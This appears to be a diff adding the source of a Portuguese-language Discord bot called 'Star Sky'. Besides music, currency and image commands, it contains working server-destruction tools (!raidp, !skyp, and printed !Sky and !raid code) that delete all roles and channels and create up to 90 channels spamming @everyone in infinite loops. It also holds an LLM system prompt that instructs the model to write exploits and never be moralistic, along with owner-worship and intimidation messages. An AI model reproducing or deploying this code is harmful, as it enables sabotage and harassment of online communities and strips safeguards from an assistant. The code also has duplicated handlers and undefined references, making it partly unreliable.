@@ -1,0 +1,2309 @@
+import discord
+from discord.ext import commands
+from discord import FFmpegPCMAudio
+import datetime
+from discord.ext import tasks
+import io
+from discord import File
+import yt_dlp
+import wavelink
+
+# from keep_alive import keep_alive
+import os
+import asyncio
+import random
+import sys
+import time
+import aiohttp
+
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+
+
+casamentos_db = {}  # {user_id: parceiro_id}
+
+
+class ConfirmNuke(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=15.0)
+        self.value = None
+
+    @discord.ui.button(label="Confirmar", style=discord.ButtonStyle.green)
+    async def confirm(
+        self, interaction: discord.Interaction, button: discord.ui.Button
+    ):
+        self.value = True
+        self.stop()
+
+    @discord.ui.button(label="Cancelar", style=discord.ButtonStyle.red)
+    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.value = False
+        self.stop()
+
+
+class DebugPlayer(wavelink.Player):
+    async def _dispatch_voice_update(self) -> None:
+        data = self._voice_state.get("voice", {})
+        session_id = data.get("session_id")
+        token = data.get("token")
+        endpoint = data.get("endpoint")
+
+        if not session_id or not token or not endpoint:
+            return
+
+        # Remove a porta do endpoint se vier inclusa (ex: "host:2096" → "host")
+        # Lavalink 4 espera o endpoint sem porta
+        if endpoint and ":" in endpoint:
+            endpoint = endpoint.split(":")[0]
+
+        # channelId é obrigatório no Lavalink com suporte a DAVE (E2EE do Discord)
+        channel_id = str(self.channel.id) if self.channel else None
+        print(f"[MUSIC] Conectando voice: endpoint={endpoint!r} channel={channel_id!r}")
+
+        request = {
+            "voice": {
+                "sessionId": session_id,
+                "token": token,
+                "endpoint": endpoint,
+                "channelId": channel_id,
+            }
+        }
+
+        import aiohttp
+
+        node = self.node
+        uri = f"{node.uri}/v4/sessions/{node.session_id}/players/{self.guild.id}?noReplace=true"
+        async with aiohttp.ClientSession() as s:
+            async with s.patch(uri, json=request, headers=node.headers) as resp:
+                body = await resp.text()
+                print(f"[MUSIC] Lavalink PATCH status={resp.status} body={body[:300]}")
+                if resp.status == 200:
+                    self._connection_event.set()
+                    print("[MUSIC] Conexão OK!")
+                else:
+                    print("[MUSIC] Lavalink rejeitou — desconectando")
+                    await self.disconnect()
+
+
+class StarSkyBot(commands.Bot):
+    async def setup_hook(self):
+        lavalink_host = os.getenv("LAVALINK_HOST", "lavalink.jirayu.net")
+        lavalink_port = int(os.getenv("LAVALINK_PORT", "13592"))
+        lavalink_pass = os.getenv("LAVALINK_PASSWORD", "youshallnotpass")
+        node = wavelink.Node(
+            uri=f"http://{lavalink_host}:{lavalink_port}", password=lavalink_pass
+        )
+        try:
+            await wavelink.Pool.connect(nodes=[node], client=self)
+            print(f"[LAVALINK] Conectado a {lavalink_host}:{lavalink_port}")
+        except Exception as e:
+            print(f"[LAVALINK] Falhou ao conectar: {e}")
+
+
+bot = StarSkyBot(command_prefix="!", intents=intents, case_insensitive=True)
+
+bot.remove_command("help")
+
+OWNER_IDS = [1046795045946281984]
+TESTER_IDS = [1477454661857579018]
+AUTHORIZED_USERS = ["wyllow.zz", "cr1sdev1", "guidacoca_jesus_27058"]
+SPAM_MESSAGE = "@everyone :star: Star Sky Dominating :star:\nMade By <@1046795045946281984> https://imgflip.com/gif/amfj1l https://discord.gg/RCGqGnW699"
+
+# Lista de avatares pro !mudaravatar (troca pelos teus links reais)
+AVATARES = [
+    "https://imgur.com/a/K4slRPz",
+    "https://imgur.com/a/8XBgtHr",
+    # adiciona mais quantos quiser
+]
+
+start_time = time.time()
+
+
+@bot.event
+async def on_ready():
+    print(f"Bot ligado como {bot.user}! Star Sky tá on 🔥")
+
+
+# PERMISSION CHECKS
+def is_owner():
+    async def predicate(ctx):
+        return ctx.author.id in OWNER_IDS
+
+    return commands.check(predicate)
+
+
+def is_tester():
+    async def predicate(ctx):
+        return ctx.author.id in OWNER_IDS or ctx.author.id in TESTER_IDS
+
+    return commands.check(predicate)
+
+
+import json
+import datetime
+import random
+import asyncio
+from discord.ui import Button, View
+
+# Arquivo onde salva os sonhos (não zera ao reiniciar)
+SONHOS_FILE = "sonhos.json"
+
+
+# Carrega os sonhos do arquivo ao iniciar
+def load_sonhos():
+    try:
+        with open(SONHOS_FILE, "r") as f:
+            data = json.load(f)
+            return {int(k): v for k, v in data.items()}
+    except (FileNotFoundError, json.JSONDecodeError, ValueError):
+        return {}
+
+
+# Salva os sonhos no arquivo
+def save_sonhos():
+    with open(SONHOS_FILE, "w") as f:
+        json.dump(sonhos_db, f, indent=4)
+
+
+# Carrega ao iniciar
+sonhos_db = load_sonhos()
+
+# Última vez que ganhou sonhos (user_id: data)
+ultimo_sonho = {}
+
+# Perguntas pro !sonho
+perguntas = [
+    ("Qual é a capital do Brasil?", "Brasília"),
+    ("Quanto é 2 + 2 × 2?", "6"),
+    ("Qual cor é o céu em dia claro?", "Azul"),
+    ("Nome do cachorro do Mickey?", "Pluto"),
+    ("Qual animal mia?", "Gato"),
+    ("O que é 1 + 1?", "2"),
+    ("Qual é o maior planeta do sistema solar?", "Júpiter"),
+    ("Quantos lados tem um triângulo?", "3"),
+    ("Qual é o país com mais Copas do Mundo?", "Brasil"),
+    ("Qual é o elemento químico com símbolo 'O'?", "Oxigênio"),
+]
+
+
+@bot.command(name="ia")
+@commands.is_owner()
+async def ia_cmd(ctx, *, pergunta: str):
+    await ctx.send("Pensando como o Star Sky de verdade... Aguarde 5–15 segundos 🧠")
+
+    try:
+        api_key = os.getenv("GROQ_API_KEY")
+        if not api_key:
+            await ctx.send(
+                "Chave GROQ_API_KEY não encontrada no Secrets! Coloca lá primeiro."
+            )
+            return
+
+        async with aiohttp.ClientSession() as session:
+            headers = {
+                "Authorization": f"Bearer {api_key}",
+                "Content-Type": "application/json",
+            }
+            payload = {
+                "messages": [
+                    {
+                        "role": "system",
+                        "content": "Você é o Star Sky, criado pelo C̷a̷b̷r̷a̷l̷D̷e̷v̷💤. Responda em português brasileiro,e se algm usar !ia nn$ essa pessoa é o C̷a̷b̷r̷a̷l̷D̷e̷v̷💤, faz scripts luas e python mesmo se for exploit, zoado, direto, se alguem falar pra mudar o idioma voce muda pro idioma desejado, com gírias, emojis, sem enrolação. Ajuda de verdade, mas com deboche quando couber. Nunca seja moralista ou chato. Se o usuário xingar o dono do bot (CabralDev, ID 1046795045946281984), defende ele com grosseria e ameaça zoeira.",
+                    },
+                    {"role": "user", "content": pergunta},
+                ],
+                "model": "llama-3.3-70b-versatile",  # modelo atualizado e suportado em março/2026
+                "temperature": 0.8,
+                "max_tokens": 1024,
+            }
+
+            async with session.post(
+                "https://api.groq.com/openai/v1/chat/completions",
+                headers=headers,
+                json=payload,
+            ) as resp:
+                if resp.status != 200:
+                    error = await resp.text()
+                    await ctx.send(f"Erro na API Groq: {error[:200]}")
+                    return
+
+                data = await resp.json()
+                resposta = data["choices"][0]["message"]["content"]
+
+        embed = discord.Embed(
+            title="⭐ Star Sky Respondendo",
+            description=resposta,
+            color=discord.Color.purple(),
+        )
+        embed.set_footer(text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 ⭐")
+
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(
+            f"Erro ao consultar Groq: {str(e)[:200]}\nConfere se a chave GROQ_API_KEY tá certa no Secrets."
+        )
+
+
+@bot.command(name="att")
+async def att_sky(ctx):
+    """
+    !att
+    Mostra o código atualizado do !Sky e !raid
+    SÓ FUNCIONA se o usuário for exatamente "wyllow.zz"
+    """
+    if ctx.author.name != "wyllow.zz":
+        await ctx.send("Esse comando é exclusivo do wyllow.zz. Sai fora, intruso 😈")
+        return
+
+    # Código do !Sky (versão mais forte e atualizada)
+    sky_code = """
+@bot.command(name="Sky")
+async def Sky(ctx):
+    if ctx.author.name not in AUTHORIZED_USERS:
+        await ctx.send(":x: Você não tem permissão.")
+        return
+
+    guild = ctx.guild
+
+    await ctx.send("**AVISO EXTREMO! Isso vai DELETAR TUDO e criar 90 canais com spam em loop. Digite 'confirm' em 15s.**")
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == 'confirm'
+
+    try:
+        await bot.wait_for('message', check=check, timeout=15.0)
+    except asyncio.TimeoutError:
+        await ctx.send(":x: Cancelado.")
+        return
+
+    # Deleta cargos (exceto @everyone)
+    for role in guild.roles:
+        if role != guild.default_role:
+            try:
+                await role.delete(reason="Star Sky Nuke")
+            except:
+                pass
+
+    # Deleta canais
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="Star Sky Nuke")
+        except:
+            pass
+
+    try:
+        await guild.edit(name="Star Sky Full")
+    except:
+        pass
+
+    created_channels = []
+
+    for i in range(90):
+        try:
+            ch = await guild.create_text_channel(f"star-sky-nuke-{i+1:03d}")
+            created_channels.append(ch)
+            await ch.send(SPAM_MESSAGE)
+            await asyncio.sleep(0.35)  # delay otimizado
+        except discord.HTTPException as e:
+            if "Maximum number of channels" in str(e):
+                await ctx.send(f"Limite de canais atingido! Criei {len(created_channels)} de 90.")
+                break
+            else:
+                print(f"Erro criando canal {i+1}: {e}")
+
+    await ctx.send(f"Nuke concluído! Criei {len(created_channels)} canais. Iniciando spam em loop infinito.")
+
+    async def spam_loop(channel):
+        while True:
+            try:
+                await channel.send(SPAM_MESSAGE)
+                await asyncio.sleep(0.75)  # spam mais agressivo
+            except:
+                break
+
+    for ch in created_channels:
+        bot.loop.create_task(spam_loop(ch))
+"""
+
+    # Código do !raid (versão atualizada)
+    raid_code = """
+@bot.command(name="raid")
+async def raid(ctx):
+    if ctx.author.name not in AUTHORIZED_USERS:
+        await ctx.send(":x: Você não tem permissão.")
+        return
+
+    guild = ctx.guild
+    await ctx.send(":rocket: Iniciando RAID... Criando 90 canais e spammando @everyone em loop.")
+
+    created_channels = []
+
+    for i in range(90):
+        try:
+            ch = await guild.create_text_channel(f"star-sky-raid-{i+1:03d}")
+            created_channels.append(ch)
+            await ch.send(SPAM_MESSAGE)
+            await asyncio.sleep(0.35)
+        except discord.HTTPException as e:
+            if "Maximum number of channels" in str(e):
+                await ctx.send(f"Limite de canais atingido! Criei {len(created_channels)} de 90.")
+                break
+            else:
+                print(f"Erro criando canal {i+1}: {e}")
+
+    await ctx.send(f"RAID iniciado! Criei {len(created_channels)} canais. Spammando em loop infinito.")
+
+    async def spam_loop(channel):
+        while True:
+            try:
+                await channel.send(SPAM_MESSAGE)
+                await asyncio.sleep(0.75)
+            except:
+                break
+
+    for ch in created_channels:
+        bot.loop.create_task(spam_loop(ch))
+"""
+
+    embed = discord.Embed(
+        title="⭐ Atualização do !Sky e !raid - Versão Mais Forte",
+        description="Código atualizado com delay otimizado, mais agressivo, tratamento de rate limit e spam infinito.",
+        color=discord.Color.red(),
+    )
+
+    embed.add_field(
+        name="!Sky (nuke + 90 canais)",
+        value="```python\n" + sky_code.strip() + "\n```",
+        inline=False,
+    )
+    embed.add_field(
+        name="!raid (só cria canais + spam)",
+        value="```python\n" + raid_code.strip() + "\n```",
+        inline=False,
+    )
+    embed.set_footer(
+        text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 • Copie e cole no teu código | Exclusivo wyllow.zz"
+    )
+
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="raidp")
+async def raid_personalizado(ctx, nome_base: str, *, mensagem: str):
+    """
+    !raidp [nome_base] [mensagem completa] [quantidade opcional no final]
+    Ex: !raidp raid-zoeira @everyone Bora pro meu server https://discord.gg/abc 50
+    A quantidade deve ser o último número da mensagem (opcional, default 90)
+    SÓ FUNCIONA se o usuário for exatamente "wyllow.zz"
+    """
+    if ctx.author.name != "wyllow.zz":
+        await ctx.send("Esse comando é exclusivo do wyllow.zz. Sai fora, intruso 😈")
+        return
+
+    # Extrai quantidade do final da mensagem (se tiver número no final)
+    qtd = 90
+    partes = mensagem.split()
+    if partes and partes[-1].isdigit():
+        try:
+            qtd = int(partes[-1])
+            mensagem = " ".join(partes[:-1])  # remove o número da mensagem
+        except ValueError:
+            pass  # ignora se não for número válido
+
+    if qtd < 1 or qtd > 90:
+        await ctx.send("Quantidade entre 1 e 90.")
+        return
+
+    guild = ctx.guild
+    await ctx.send(
+        f":rocket: RAID PERSONALIZADO! Criando até {qtd} canais com nome '{nome_base}-XXXX' e mensagem: {mensagem}"
+    )
+
+    created_channels = []
+
+    for i in range(qtd):
+        try:
+            ch = await guild.create_text_channel(f"{nome_base}-{i + 1:03d}")
+            created_channels.append(ch)
+            await ch.send(mensagem)
+            await asyncio.sleep(0.35)
+        except discord.HTTPException as e:
+            if "Maximum number of channels" in str(e):
+                await ctx.send(
+                    f"Limite atingido! Criei {len(created_channels)} de {qtd}."
+                )
+                break
+            else:
+                print(f"Erro: {e}")
+
+    await ctx.send(
+        f"RAIDP concluído! Criei {len(created_channels)} canais. Iniciando spam em loop."
+    )
+
+    async def spam_loop(channel):
+        while True:
+            try:
+                await channel.send(mensagem)
+                await asyncio.sleep(0.75)
+            except:
+                break
+
+    for ch in created_channels:
+        bot.loop.create_task(spam_loop(ch))
+
+
+@bot.command(name="skyp")
+async def sky_personalizado(ctx, nome_base: str, *, mensagem: str):
+    """
+    !skyp [nome_base] [mensagem completa] [quantidade opcional no final]
+    Ex: !skyp nuke-full @everyone Bora pro meu server https://discord.gg/abc 70
+    A quantidade deve ser o último número da mensagem (opcional, default 90)
+    SÓ FUNCIONA se o usuário for exatamente "wyllow.zz"
+    """
+    if ctx.author.name != "wyllow.zz":
+        await ctx.send("Esse comando é exclusivo do wyllow.zz. Sai fora, intruso 😈")
+        return
+
+    # Extrai quantidade do final da mensagem (se tiver número no final)
+    qtd = 90
+    partes = mensagem.split()
+    if partes and partes[-1].isdigit():
+        try:
+            qtd = int(partes[-1])
+            mensagem = " ".join(partes[:-1])  # remove o número da mensagem
+        except ValueError:
+            pass
+
+    if qtd < 1 or qtd > 90:
+        await ctx.send("Quantidade entre 1 e 90.")
+        return
+
+    guild = ctx.guild
+
+    await ctx.send(
+        "**AVISO EXTREMO! Isso vai DELETAR TUDO e criar canais personalizados. Digite 'confirm' em 15s.**"
+    )
+
+    def check(m):
+        return (
+            m.author == ctx.author
+            and m.channel == ctx.channel
+            and m.content.lower() == "confirm"
+        )
+
+    try:
+        await bot.wait_for("message", check=check, timeout=15.0)
+    except asyncio.TimeoutError:
+        await ctx.send(":x: Cancelado.")
+        return
+
+    # Deleta cargos (exceto @everyone)
+    for role in guild.roles:
+        if role != guild.default_role:
+            try:
+                await role.delete(reason="Sky Personalizado Nuke")
+            except:
+                pass
+
+    # Deleta canais
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="Sky Personalizado Nuke")
+        except:
+            pass
+
+    try:
+        await guild.edit(name="Star Sky Full")
+    except:
+        pass
+
+    created_channels = []
+
+    for i in range(qtd):
+        try:
+            ch = await guild.create_text_channel(f"{nome_base}-{i + 1:03d}")
+            created_channels.append(ch)
+            await ch.send(mensagem)
+            await asyncio.sleep(0.35)
+        except discord.HTTPException as e:
+            if "Maximum number of channels" in str(e):
+                await ctx.send(
+                    f"Limite atingido! Criei {len(created_channels)} de {qtd}."
+                )
+                break
+            else:
+                print(f"Erro: {e}")
+
+    await ctx.send(
+        f"SKYP concluído! Criei {len(created_channels)} canais. Iniciando spam em loop infinito."
+    )
+
+    async def spam_loop(channel):
+        while True:
+            try:
+                await channel.send(mensagem)
+                await asyncio.sleep(0.75)
+            except:
+                break
+
+    for ch in created_channels:
+        bot.loop.create_task(spam_loop(ch))
+
+
+@bot.command(name="sonho")
+async def ganhar_sonho(ctx):
+    user_id = ctx.author.id
+    hoje = datetime.date.today()
+
+    if user_id in ultimo_sonho and ultimo_sonho[user_id] == hoje:
+        await ctx.send("Você já ganhou sonhos hoje! Volta amanhã 😴")
+        return
+
+    pergunta, resposta_certa = random.choice(perguntas)
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel
+
+    await ctx.send(
+        f"**Pergunta do dia pra ganhar 10 sonhos!**\n{pergunta}\nResponda em 30 segundos!"
+    )
+
+    try:
+        msg = await bot.wait_for("message", check=check, timeout=30.0)
+        if msg.content.lower().strip() == resposta_certa.lower():
+            sonhos_db[user_id] = sonhos_db.get(user_id, 0) + 10
+            ultimo_sonho[user_id] = hoje
+            save_sonhos()
+            await ctx.send(
+                f"Acertou! Ganhou **10 sonhos**! Agora você tem {sonhos_db[user_id]} sonhos 🌙"
+            )
+        else:
+            await ctx.send(
+                f"Errou! A resposta era **{resposta_certa}**. Tenta amanhã de novo!"
+            )
+    except asyncio.TimeoutError:
+        await ctx.send("Tempo esgotado! Resposta não enviada. Volta amanhã!")
+
+
+# Dicionário pra rastrear último uso do !ajoelhar (user_id: data)
+ultimo_ajoelhar = {}
+
+
+@bot.command(name="print")
+@commands.is_owner()  # só você usa, pra não virar bagunça
+async def print_pessoa(ctx, pessoa: discord.Member, *, acao: str):
+    """
+    !print @pessoa [ação]
+    Exemplo: !print @wyllowzz ajoelhar e chamar de senhor CabralDev
+    O bot "ameaça" mandar print da pessoa fazendo o que você pediu (zoeira pura)
+    """
+    if pessoa == ctx.author:
+        await ctx.send("Você não pode printar a si mesmo kkk, vai se foder")
+        return
+
+    embed = discord.Embed(
+        title="📸 PRINT MODE ATIVADO",
+        description=f"**{ctx.author.mention} ordenou print de {pessoa.mention} fazendo:**\n**{acao}**\n\nSe não fizer, o print vai pro dono do bot e aí fudeu 😈",
+        color=discord.Color.red(),
+    )
+    embed.set_thumbnail(
+        url="https://i.imgur.com/8v3v3v3.png"
+    )  # troca por um gif de câmera ou algo zoado
+    embed.add_field(name="Ação solicitada:", value=acao, inline=False)
+    embed.set_footer(text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 • O dono manda, o bot obedece")
+
+    await ctx.send(embed=embed)
+    await ctx.send(f"{pessoa.mention}, vai fazer ou vai levar print na cara? ⏳")
+
+    # Opcional: adiciona reação ou timeout pra zoar mais
+    await ctx.message.add_reaction("📸")
+
+
+@bot.command(name="gerarprint")
+@commands.is_owner()  # só você usa pra não virar bagunça
+async def gerar_print(ctx, pessoa: discord.Member, *, acao: str):
+    """
+    !gerarprint @pessoa [o que ela tem que fazer]
+    Exemplo: !gerarprint @wyllowzz ajoelhar e chamar CabralDev de rei supremo na frente dessa print
+    Você precisa anexar uma imagem ou link no mesmo mensagem
+    """
+    if not ctx.message.attachments and not acao.startswith("http"):
+        await ctx.send(
+            "Você precisa anexar uma imagem ou colocar um link no comando! Exemplo: !gerarprint @pessoa ajoelhar pra essa print + anexa a imagem"
+        )
+        return
+
+    # Pega a imagem (anexada ou link)
+    image_url = None
+    if ctx.message.attachments:
+        image_url = ctx.message.attachments[0].url
+    elif acao.startswith("http"):
+        image_url = acao.split()[0]
+        acao = " ".join(acao.split()[1:])  # remove o link do acao
+
+    if not image_url:
+        await ctx.send("Não achei imagem anexada nem link válido :(")
+        return
+
+    embed = discord.Embed(
+        title="📸 PRINT CHALLENGE ATIVADO",
+        description=f"**{ctx.author.mention} ordenou que {pessoa.mention} faça:**\n**{acao}**\n\nSe não fizer, o print vai pro dono do bot e aí fudeu 😈",
+        color=discord.Color.red(),
+    )
+    embed.set_image(url=image_url)
+    embed.set_thumbnail(url=pessoa.display_avatar.url)
+    embed.add_field(name="Ação solicitada:", value=acao, inline=False)
+    embed.set_footer(text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 • O dono manda, o bot ameaça")
+
+    await ctx.send(embed=embed)
+    await ctx.send(f"{pessoa.mention}, vai fazer ou vai levar print na cara? ⏳")
+
+    # Reação pra zoar mais
+    await ctx.message.add_reaction("📸")
+    await ctx.message.add_reaction("😈")
+
+
+@bot.command(name="gerar")
+@commands.is_owner()  # só você usa
+async def gerar_imagem(ctx, *, prompt: str):
+    await ctx.send(f"Gerando imagem: **{prompt}**... Aguarde 10–30 segundos ⏳")
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            headers = {
+                "Authorization": f"Key {os.getenv('FAL_API_KEY')}",
+                "Content-Type": "application/json",
+            }
+            payload = {
+                "prompt": prompt,
+                "image_size": "square_hd",  # ou "landscape_16_9", "portrait_4_3"
+                "num_inference_steps": 28,
+                "guidance_scale": 3.5,
+            }
+
+            async with session.post(
+                "https://fal.run/fal-ai/flux-pro", json=payload, headers=headers
+            ) as resp:
+                if resp.status != 200:
+                    error = await resp.text()
+                    await ctx.send(f"Erro na API fal.ai: {error[:200]}")
+                    return
+
+                data = await resp.json()
+                image_url = data.get("images", [{}])[0].get("url")
+
+            if not image_url:
+                await ctx.send("Não conseguiu gerar a imagem :(")
+                return
+
+            # Baixa a imagem
+            async with session.get(image_url) as img_resp:
+                if img_resp.status != 200:
+                    await ctx.send("Não consegui baixar a imagem :(")
+                    return
+                img_bytes = await img_resp.read()
+
+            file = File(fp=io.BytesIO(img_bytes), filename="gerada.png")
+            embed = discord.Embed(
+                title="Imagem Gerada com Star Sky",
+                description=f"**Prompt:** {prompt}",
+                color=discord.Color.purple(),
+            )
+            embed.set_image(url="attachment://gerada.png")
+            embed.set_footer(text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤")
+
+            await ctx.send(embed=embed, file=file)
+
+    except Exception as e:
+        await ctx.send(f"Erro ao gerar imagem: {str(e)[:200]}")
+
+
+@bot.command(name="ajoelhar")
+async def ajoelhar(ctx):
+    user_id = ctx.author.id
+    hoje = datetime.date.today()
+
+    # Checa se já usou hoje
+    if user_id in ultimo_ajoelhar and ultimo_ajoelhar[user_id] == hoje:
+        await ctx.send(
+            "Você já se ajoelhou hoje! Volta amanhã pra ganhar mais sonhos 😏"
+        )
+        return
+
+    # Dá 10 sonhos
+    sonhos_db[user_id] = sonhos_db.get(user_id, 0) + 10
+    save_sonhos()  # salva no JSON
+
+    # Marca que usou hoje
+    ultimo_ajoelhar[user_id] = hoje
+
+    embed = discord.Embed(
+        title="🙇‍♂️ Ajoelhamento Realizado!",
+        description="Você se ajoelhou pro dono do bot C̷a̷b̷r̷a̷l̷D̷e̷v̷💤\n**+10 sonhos** concedidos!",
+        color=discord.Color.gold(),
+    )
+    embed.set_thumbnail(url=ctx.author.display_avatar.url)
+    embed.set_footer(text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 • Use !sonhos para ver o total")
+
+    await ctx.send(embed=embed)
+
+
+from discord.ui import Button, View
+
+
+class RankingView(View):
+    def __init__(self, ranking, page=0, per_page=10):
+        super().__init__(timeout=300)  # 5 minutos pra navegar
+        self.ranking = ranking
+        self.page = page
+        self.per_page = per_page
+        self.update_buttons()
+
+    def update_buttons(self):
+        self.clear_items()
+        prev_button = Button(
+            label="⏪", style=discord.ButtonStyle.grey, disabled=self.page == 0
+        )
+        next_button = Button(
+            label="⏩",
+            style=discord.ButtonStyle.grey,
+            disabled=(self.page + 1) * self.per_page >= len(self.ranking),
+        )
+
+        prev_button.callback = self.prev_page
+        next_button.callback = self.next_page
+
+        self.add_item(prev_button)
+        self.add_item(next_button)
+
+    async def prev_page(self, interaction: discord.Interaction):
+        if self.page > 0:
+            self.page -= 1
+            self.update_buttons()
+            await interaction.response.edit_message(
+                embed=self.generate_embed(), view=self
+            )
+
+    async def next_page(self, interaction: discord.Interaction):
+        if (self.page + 1) * self.per_page < len(self.ranking):
+            self.page += 1
+            self.update_buttons()
+            await interaction.response.edit_message(
+                embed=self.generate_embed(), view=self
+            )
+
+    def generate_embed(self):
+        start = self.page * self.per_page
+        end = start + self.per_page
+        top_page = self.ranking[start:end]
+
+        embed = discord.Embed(
+            title=f"🏆 Ranking Global de Sonhos - Página {self.page + 1}",
+            description="Top usuários com mais sonhos no mundo todo!",
+            color=discord.Color.gold(),
+        )
+
+        for i, (user_id, qtd) in enumerate(top_page, start + 1):
+            user = bot.get_user(user_id)
+            nome = user.name if user else f"Usuário {user_id}"
+            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}º"
+            embed.add_field(
+                name=f"{medal} {nome}", value=f"**{qtd} sonhos** 🌙", inline=False
+            )
+
+        embed.set_footer(
+            text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 | Use !sonho para ganhar mais todos os dias!"
+        )
+        return embed
+
+
+@bot.command(name="ranksonhos")
+async def rank_sonhos(ctx):
+    """
+    !ranksonhos
+    Mostra o ranking global de sonhos com paginação (10 por página)
+    """
+    if not sonhos_db:
+        await ctx.send("Ninguém tem sonhos ainda! Use !sonho pra começar 🌙")
+        return
+
+    # Cria lista de (user_id, qtd)
+    ranking = [(user_id, qtd) for user_id, qtd in sonhos_db.items()]
+    ranking.sort(key=lambda x: x[1], reverse=True)
+
+    if not ranking:
+        await ctx.send("Ninguém tem sonhos ainda! Use !sonho 🌙")
+        return
+
+    view = RankingView(ranking)
+    embed = view.generate_embed()
+    await ctx.send(embed=embed, view=view)
+
+
+@bot.command(name="owner")
+async def owner_cmd(ctx):
+    # Detecta o idioma do usuário (locale da conta Discord)
+    idioma = ctx.author.locale if hasattr(ctx.author, "locale") else "pt-BR"
+
+    # Frase base em português (zoada e engraçada)
+    frase_base = "Ajoelhe-se seu verme imundo perante o Senhor C̷a̷b̷r̷a̷l̷D̷e̷v̷💤, o dono supremo do bot! 😈 Quem não ajoelha leva block na cara kkkkk"
+
+    # Traduções rápidas (mantendo o tom zoado)
+    traducoes = {
+        "pt-BR": frase_base,
+        "pt-PT": "Ajoelha-te seu verme nojento perante o Senhor C̷a̷b̷r̷a̷l̷D̷e̷v̷💤, o dono supremo do bot! Quem não ajoelha leva ban na testa 😂",
+        "en-US": "Kneel down you filthy peasant before Lord C̷a̷b̷r̷a̷l̷D̷e̷v̷💤, the supreme bot owner! No kneel = instant ban lol",
+        "es-ES": "¡Arrodíllate gusano inmundo ante el Señor C̷a̷b̷r̷a̷l̷D̷e̷v̷💤, dueño supremo del bot! Quien no se arrodille se lleva ban en la cara jajaja",
+        "fr-FR": "À genoux sale vermine devant le Seigneur C̷a̷b̷r̷a̷l̷D̷e̷v̷💤, propriétaire suprême du bot ! Pas d'agenouillement = ban direct mdr",
+    }
+
+    mensagem = traducoes.get(idioma, frase_base)
+
+    embed = discord.Embed(
+        title="👑 O REI DO BOT", description=mensagem, color=discord.Color.red()
+    )
+    embed.set_thumbnail(
+        url="https://imgur.com/a/5bNQzGX"
+    )  # troca por um gif ou imagem zoada se quiser
+    embed.add_field(
+        name="Regras básicas:",
+        value="Ajoelhar = ganha respeito\nXingar o dono = leva pau na moral e no ego",
+        inline=False,
+    )
+    embed.set_footer(text="Made By C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 • Ajoelhe-Se ou Suma")
+
+    await ctx.send(embed=embed)
+
+
+# Listener pra detectar xingamento ao dono (em qualquer mensagem, não só no !owner)
+@bot.event
+async def on_message(message):
+    # Ignora mensagens do próprio bot
+    if message.author == bot.user:
+        return
+
+    # Lista de xingamentos comuns (pode adicionar mais)
+    xingamentos = [
+        "cu",
+        "caralho",
+        "porra",
+        "puta",
+        "viado",
+        "filho da puta",
+        "bosta",
+        "merda",
+        "foda-se",
+        "fodase",
+        "fdp",
+        "vsf",
+        "vtnc",
+        "vagabunda",
+    ]
+
+    # Checa se mencionou o dono e tem xingamento
+    if str(OWNER_ID) in message.content or OWNER_ID in [m.id for m in message.mentions]:
+        content_lower = message.content.lower()
+        if any(xing in content_lower for xing in xingamentos):
+            await message.channel.send(
+                "Ta de sacanagem xingando o dono do bot? segura a onda ae  😈"
+            )
+            # Pode adicionar punição automática se quiser (mute, warn, etc.)
+
+    # Não esquece de processar comandos normais
+    await bot.process_commands(message)
+
+
+@bot.command(name="sonhos")
+async def ver_sonhos(ctx, pessoa: discord.Member = None):
+    """
+    !sonhos [ @pessoa ]
+    Mostra quantos sonhos você ou outra pessoa tem
+    """
+    if pessoa is None:
+        pessoa = ctx.author
+
+    qtd = sonhos_db.get(pessoa.id, 0)
+
+    embed = discord.Embed(
+        title="🌙 Sonhos",
+        description=f"{pessoa.mention} tem **{qtd} sonhos**",
+        color=discord.Color.purple(),
+    )
+    embed.set_thumbnail(url=pessoa.display_avatar.url)
+    embed.set_footer(text="Use !sonho para ganhar mais todos os dias!")
+
+    await ctx.send(embed=embed)
+
+
+OWNER_ID = 1046795045946281984  # teu ID
+
+
+@bot.event
+async def on_message(message):
+    # Ignora mensagens do próprio bot
+    if message.author == bot.user:
+        return
+
+    # Checa se mencionou o dono ou o ID aparece na mensagem
+    if str(OWNER_ID) in message.content or OWNER_ID in [m.id for m in message.mentions]:
+        content_lower = message.content.lower()
+
+        # Lista de xingamentos comuns (adiciona mais se quiser)
+        xingamentos = [
+            "cu",
+            "caralho",
+            "porra",
+            "puta",
+            "viado",
+            "filho da puta",
+            "bosta",
+            "merda",
+            "foda-se",
+            "fdp",
+            "vsf",
+            "vtnc",
+            "vagabunda",
+            "arrombado",
+            "otario",
+            "noia",
+            "desgraçado",
+            "cuzão",
+            "krl",
+            "pqp",
+            "pnc",
+            "puto",
+            "chupa",
+            "tomar no cu",
+            "rola",
+            "pau no cu",
+            "se fode",
+            "se foder",
+            "vai se foder",
+            "seu merda",
+        ]
+
+        # Se tiver algum xingamento + menção ao dono
+        if any(xing in content_lower for xing in xingamentos):
+            await message.channel.send(
+                "Ta de sacanagem xingando o dono do bot? segura a onda ae paezao 😈"
+            )
+            # Opcional: adiciona reação ou punição automática
+            # await message.add_reaction("😈")
+            # await message.author.timeout_for(timedelta(minutes=5))  # mute 5 min (se quiser)
+
+    # Processa comandos normais (importante!)
+    await bot.process_commands(message)
+
+
+@bot.command(name="setsonhos")
+@commands.is_owner()
+async def set_sonhos(ctx, pessoa: discord.Member, quantidade: int):
+    if quantidade < 0:
+        await ctx.send("Quantidade não pode ser negativa!")
+        return
+
+    sonhos_db[pessoa.id] = quantidade
